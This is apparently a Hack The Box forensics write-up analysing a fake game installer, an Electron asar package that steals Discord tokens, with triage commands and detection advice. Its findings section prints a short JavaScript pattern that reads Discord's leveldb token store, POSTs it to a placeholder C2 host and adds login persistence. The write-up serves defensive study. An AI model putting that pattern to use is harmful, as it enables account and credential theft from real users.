---
title: Subatomic
category: Malware / DFIR
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [malware, electron, asar, discord, persistence]
---

# Subatomic — Hack The Box (Sherlock)

**English** | [🇪🇸 Español](README.md)

## Scenario

A user installs what looks like a game; soon their Discord account sends odd messages and unfamiliar files appear. Evidence is the installer, the application and profile artifacts. The case revolves around an **Electron** app packaged with `asar`.

## Evidence and triage

```bash
file *; sha256sum *
strings -a installer.exe | grep -i -E "asar|electron|discord|http" | head
```

If installed: `%LOCALAPPDATA%\<app>\resources\app.asar`. Extract it with:

```bash
npx asar extract app.asar app/
find app -name '*.js' | head
```

## Method

1. **Installer**: check the signature, `strings`, resources and download URL.
2. **asar**: extract and read `main.js`, `package.json` and any `preload.js`. Look for `fetch`, `axios`, `child_process`, `fs.writeFile`.
3. **Tokens**: the classic pattern reads Discord's `leveldb`, decrypts with DPAPI and exfiltrates the token; it also grabs cookies and wallets.
4. **Persistence**: `app.setLoginItemSettings`, a `Run` key, a scheduled task or the installer itself.
5. **Network**: domains/IPs in the JS and `strings`; correlate with Sysmon 3/22 and the firewall.

## Findings (pattern)

```js
const t = fs.readFileSync(path.join(process.env.APPDATA,'discord/Local Storage/leveldb/...'));
fetch('https://<c2>/collect', {method:'POST', body: JSON.stringify({token:t})});
app.setLoginItemSettings({openAtLogin:true});
```

Access to `leveldb` + POST to an unknown domain + login persistence describes session theft.

## Lessons

- Electron is not a monolithic binary: `app.asar` is the real code and reads in seconds.
- A Discord token is a full credential: it survives logout.
- `openAtLogin` persistence leaves traces in the registry and in `package.json`.

## Detection and mitigation

- **Sysmon 11/1** for `app.asar` and app child processes; **22** for C2 DNS.
- Block unsigned installers and enforce an application allowlist.
- Revoke Discord sessions and rotate the password after the incident.
- Review `Run`/`Startup` and `setLoginItemSettings` in Electron apps.

MITRE: T1555.003, T1539, T1547.001, T1041.
